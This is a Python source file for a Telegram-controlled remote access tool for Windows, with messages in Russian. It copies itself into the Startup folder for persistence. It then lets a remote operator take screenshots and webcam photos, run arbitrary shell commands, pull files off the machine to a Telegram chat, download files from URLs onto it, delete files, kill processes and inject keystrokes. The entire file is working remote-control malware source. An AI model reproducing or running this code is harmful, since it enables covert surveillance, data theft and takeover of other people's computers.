import telebot
from pyautogui import hotkey, moveTo
import os
import time
from pyscreeze import screenshot
import PIL
from webbrowser import open as webbrowser_open
from random import uniform
from subprocess import run, PIPE, STDOUT
from locale import setlocale, LC_ALL
from cv2 import VideoCapture, imwrite
from win32gui import MessageBox, GetForegroundWindow
from win32con import MB_OK, MB_ICONWARNING, MB_ICONINFORMATION
from win32api import GetUserName, MoveFile
from keyboard import press_and_release
from clipboard import copy as clip_copy
from pygame import mixer
from requests import get, status_codes
from sys import executable
from shutil import copy
from functools import wraps

bot = telebot.TeleBot('')
adminid = []
filenamebase = os.path.basename(executable)
current_file  = executable
username = GetUserName()
srcautostart = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filenamebase}'

#САМОКОПИРОВАНИЕ В АВТОЗАПУСК
try:
    if current_file != srcautostart:
        copy(executable, srcautostart)
        os.startfile(srcautostart)
        os._exit(0)
except: pass


scr1 = None
scr2 = None
oldname = None
newname = None

def failcheck(func):
    @wraps(func)
    def wrapper(message,*args, **kwargs):
        try:
            func(message,*args,**kwargs)
        except Exception as e:
            bot.reply_to(message, e)
    return wrapper



@bot.message_handler(func=lambda message: message.from_user.id not in adminid)
def non(message):
    bot.send_message(message.chat.id, 'Пользование запрещено')

@bot.message_handler(commands=['screenshot'])
@failcheck
def scr(message):
    filename = f"{time.time()}.jpg"
    try:
        os.mkdir('C:\\pyvdonw')
    except: pass
    bot.send_message(message.chat.id, time.ctime(time.time()))
    screenshot(f'C:\\pyvdonw\\{filename}')

    with open(f'C:\\pyvdonw\\{filename}', "rb") as img:
        bot.send_photo(message.chat.id, img)
    os.remove(f'C:\\pyvdonw\\{filename}')

@bot.message_handler(commands=['pcoff'])
@failcheck
def off(message):
    bot.send_message(message.chat.id, 'Компьютер выключен')
    os.system("shutdown -s -t 01")

@bot.message_handler(commands=['message_inf'])
@failcheck
def msg1(message):
    nc = message.text.replace("/message_inf", "").strip()
    if nc:
        MessageBox(GetForegroundWindow(), nc, 'Ошибка', MB_OK | MB_ICONINFORMATION)

@bot.message_handler(commands=['message_war'])
@failcheck
def msg1(message):
    nc = message.text.replace("/message_war", "").strip()
    if nc:
        MessageBox(GetForegroundWindow(), nc, 'Ошибка', MB_OK | MB_ICONWARNING)

@bot.message_handler(commands=['wincl'])
@failcheck
def wc(message):
    press_and_release('alt+f4')
    bot.send_message(message.chat.id, 'Окно закрыто')

@bot.message_handler(commands=['leave'])
@failcheck
def lv(message):
    bot.send_message(message.chat.id, 'Выход из профиля')
    hotkey('win', 'l')

@bot.message_handler(commands=['link'])
@failcheck
def lin1(message):
    nc = message.text.replace("/link", "").strip()
    if nc:
        webbrowser_open(nc)
        bot.send_message(message.chat.id, 'Ссылка открыта')

@bot.message_handler(commands=['f'])
@failcheck
def lin1(message):
    bot.send_message(message.chat.id,
                        """Функции:
                        
/version - версия программы
/screenshot - скриншот
/pcoff - выключение пк
/message_inf (текст) - отправка текста на экран с иконкой информации
/message_war (текст) - отправка текста на экран с иконкой ошибки
/wincl - закрытие активного окна
/leave - выйти из профиля
/link (текст) - открытие ссылки
/randommouse - рандомное движение мыши
/upload - скачивание файла (до 50мб!!)
/uploadrequest - скачивнаие файла с облака (ввести команду, url, имя файла)
/startfile (текст) - запуск файла (абсолютный путь)
/move - перемещение файла (без замены)
/remove (текст) - удаление файла (абсолютный путь)
/rename (текст) - переименование файла (абсолютный путь)
/listdir (текст) - узнать файлы в директории
/cmd (текст) - коммандная строка
/getcwd - путь до исполняемого файла
/webcam - фото с вебки (тестовая функция)
/getusername - получить имя пользователя
/processend (текст) - завершение процесса
/allprocess - показать все активные процессы
/press_button (текст) - комбинация горячих клавиш
/send (текст) - отправка файла в чат по абсолютному пути
/audio - запуск аудиофайла (не гс!!!!)
/stop - остановка аудифайла
/clipboard (текст) - вставка текста""")

@bot.message_handler(commands=['randommouse'])
@failcheck
def rm(message):
    moveTo(uniform(0, 1920),uniform(0, 1080), 2)

@bot.message_handler(commands=['upload'])
@failcheck
def u1(message):
    mesg = bot.send_message(message.chat.id, 'Отправьте файл')
    bot.register_next_step_handler(mesg, u2)
@failcheck
def u2(message):
    try:
        os.mkdir('C:\\pyvdonw')
    except: pass
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    src = 'C:\\pyvdonw\\' + message.document.file_name
    with open(src, 'wb') as new_file:
        new_file.write(downloaded_file)
        bot.reply_to(message, f'Сохранен в C:\\pyvdonw\\{message.document.file_name}')

@bot.message_handler(commands=['startfile'])
@failcheck
def sf1(message):
    nc = message.text.replace('/startfile','').strip()
    if nc:
        os.startfile(nc)
        bot.send_message(message.chat.id,f'Файл {nc} запущен')
    else: pass

@bot.message_handler(commands=['move'])
@failcheck
def rep(message):
    inp = bot.send_message(message.chat.id, 'Введите абсолютный путь переносимого файла')
    bot.register_next_step_handler(inp, rep2)
@failcheck
def rep2(message):
    global scr1, scr2
    scr1 = message.text
    inp = bot.send_message(message.chat.id, 'Введите абсолютный путь для переноса (с именем файла)')
    bot.register_next_step_handler(inp, rep3)
@failcheck
def rep3(message):
    global scr1, scr2
    scr2 = message.text
    MoveFile(scr1, scr2)
    bot.send_message(message.chat.id, f'Файл по пути: {scr1} перемещен в {scr2}' )

@bot.message_handler(commands=['remove'])
@failcheck
def rem(message):
    nc = message.text.replace("/remove", "").strip()
    if nc:
        os.remove(nc)
        bot.send_message(message.chat.id, f'Файл по пути {nc} удален')

@bot.message_handler(commands=['rename'])
@failcheck
def ren(message):
    nc = message.text.replace("/rename", "").strip()
    if nc:
        global oldname, newname
        oldname = nc
        inp = bot.send_message(message.chat.id, 'Введите новое имя файла (полный путь)')
        bot.register_next_step_handler(inp, ren2)
@failcheck
def ren2(message):
    global oldname, newname
    newname = message.text
    os.rename(oldname, newname)
    bot.send_message(message.chat.id, f'Файл по пути: {oldname} переименован в {newname}')

@bot.message_handler(commands=['listdir'])
@failcheck
def dir(message):
    nc = message.text.replace("/listdir", "").strip()
    if nc:
        dir = os.listdir(nc)
        scr = nc
        coment = f'Файлы в каталоге {scr} :'
        res = [coment]
        for i in dir:
            res.append(i)
        bot.send_message(message.chat.id, '\n'.join(res))
@bot.message_handler(commands=['cmd'])
@failcheck
def cm(message):
    nc = message.text.replace("/cmd", "").strip()
    if nc:
        setlocale(LC_ALL, 'ru_RU.UTF-8')
        result = run(nc, shell=True, stdout=PIPE, stderr=PIPE, text=True,
                                encoding='cp866')
        output_message = f"Вывод:\n{result.stdout}\nОшибка:\n{result.stderr}"
        bot.send_message(message.chat.id, output_message)

@bot.message_handler(commands=['getcwd'])
@failcheck
def lin1(message):
    bot.send_message(message.chat.id, f'Путь до исполняемого файла: {executable}')

@bot.message_handler(commands=["webcam"])
@failcheck
def webcam(message):
    try:
        os.mkdir('C:\\pyvdonw')
    except: pass
    filename = "C:\\pyvdonw\\cam.jpg"
    cap = VideoCapture(0)
    ret, frame = cap.read()
    imwrite(filename, frame)
    cap.release()
    with open(filename, "rb") as img:
        bot.send_photo(message.chat.id, img)
    os.remove(filename)

@bot.message_handler(commands=['getusername'])
@failcheck
def us1(message):
    a = GetUserName()
    bot.send_message(message.chat.id, f'Имя пользователя -- {a}')

@bot.message_handler(commands=['processend'])
@failcheck
def pe1 (message):
    nc = message.text.replace("/processend", "").strip()
    if nc:
        os.system(f'taskkill /f /im {nc}')
        bot.send_message(message.chat.id, f'Процесс {message.text} закрыт')

@bot.message_handler(commands=['allprocess'])
@failcheck
def p1 (message):
    b = os.popen('wmic process get description').read()
    b = b.split()
    a = []
    for i in b:
        if i != 'svchost.exe':
            a.append(i)
    b = sorted(a)
    bot.send_message(message.chat.id, f'Запущенные программы: {'\n'.join(b)}')

@bot.message_handler(commands=['press_button'])
@failcheck
def press_buttons(message):
    new_command = message.text.replace("/press_button", "").strip()
    if new_command:
        press_and_release(new_command)
        bot.reply_to(message, f"Кнопка(и) {new_command} была нажата(ы)")

@bot.message_handler(commands=['send'])
@failcheck
def pe1 (message):
    nc = message.text.replace("/send", "").strip()
    if nc:
        bot.send_document(message.chat.id, open(nc, 'rb'), caption=f'Файл по пути {nc}')

@bot.message_handler(commands=['audio'])
@failcheck
def a1(message):
    mesg = bot.send_message(message.chat.id, 'Отправьте аудио')
    bot.register_next_step_handler(mesg, a2)
@failcheck
def a2(message):
    try:
        os.mkdir('C:\\pyvdonw')
    except: pass
    file_info = bot.get_file(message.audio.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    src = 'C:\\pyvdonw\\audio.mp3'
    with open(src, 'wb') as new_file:
        new_file.write(downloaded_file)
    mixer.init()
    mixer.music.load(src)
    mixer.music.set_volume(1)
    bot.send_message(message.chat.id, 'Аудио запущено')
    mixer.music.play()
    while mixer.music.get_busy() != False:
        if mixer.music.get_busy() == False:
            mixer.music.unload()
    try:
        os.remove(src)
    except: pass
    mixer.music.unload()
    try:
        os.remove('C:\\pyvdonw\\audio.mp3')
    except: pass

@bot.message_handler(commands=['stop'])
@failcheck
def s(message):
    mixer.music.stop()
    mixer.music.unload()
    bot.send_message(message.chat.id, 'Аудио остановлено')
    try:
        os.remove('C:\\pyvdonw\\audio.mp3 ')
    except: pass

@bot.message_handler(commands=['uploadrequest'])
@failcheck
def upload(message):
    try:
        os.mkdir('C:\\pyvdonw')
    except: pass
    name = message.text.split(' ')
    print(name)
    upl = name[1]
    filename = name[2]
    if upl != "/uploadrequest ":
        response = get(upl)
        if response.status_code == 200:
            with open(f'C:\\pyvdonw\\{filename}', 'wb') as file:
                file.write(response.content)
            bot.send_message(message.chat.id, f'Файл загружен по пути C:\\pyvdonw\\{filename}')
    else: pass

@bot.message_handler(commands=['clipboard'])
@failcheck
def clip (message):
    nc = message.text.replace("/clipboard", "").strip()
    if nc:
        clip_copy(nc)
        press_and_release('ctrl+v')
        bot.send_message(message.chat.id, f'Текст ( {nc} ) вставлен')

@bot.message_handler(commands=['version'])
@failcheck
def clip (message):
    bot.send_message(message.chat.id, 'Версия: 1.1')

while True:
    try:
        for i in adminid:
            bot.send_message(i, "Компьютер включен.")
        bot.polling(none_stop=True)
    except:
        time.sleep(5)
        pass